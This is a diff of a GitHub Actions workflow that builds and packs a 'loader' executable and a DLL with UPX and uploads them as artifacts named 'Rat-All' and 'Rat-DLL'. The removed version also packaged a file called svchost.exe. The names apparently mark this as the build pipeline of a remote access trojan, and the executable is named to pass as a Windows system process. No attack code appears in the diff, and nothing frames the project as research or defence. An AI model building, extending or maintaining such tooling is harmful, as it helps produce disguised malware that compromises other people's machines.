@@ -1,4 +1,4 @@
-name: Build Loader Compact
+name: Build Loader
 
 on:
   workflow_run:
@@ -21,18 +21,11 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
       
-      - name: Install dependencies
-        run: |
-          pip install pyinstaller
-      
-      - name: Install UPX
-        run: choco install upx -y
-      
       - name: Install MinGW
         run: choco install mingw -y
       
-      - name: Install zlib
-        run: choco install zlib -y
+      - name: Install UPX
+        run: choco install upx -y
       
       - name: Download artifact from main build
         if: ${{ github.event_name == 'workflow_run' }}
@@ -43,9 +36,9 @@ jobs:
           github-token: ${{ secrets.GITHUB_TOKEN }}
           run-id: ${{ github.event.workflow_run.id }}
       
-      - name: Build C loader
+      - name: Build loader
         run: |
-          python loader_builder_c.py
+          python loader_builder.py
       
       - name: Upload loader
         uses: actions/upload-artifact@v4
@@ -54,11 +47,9 @@ jobs:
           path: dist/loader_*.exe
           retention-days: 7
       
-      - name: Upload both versions
+      - name: Upload DLL
         uses: actions/upload-artifact@v4
         with:
-          name: Rat-All
-          path: |
-            dist/svchost.exe
-            dist/loader_*.exe
+          name: Rat-DLL
+          path: dist/lib*.dll
           retention-days: 7
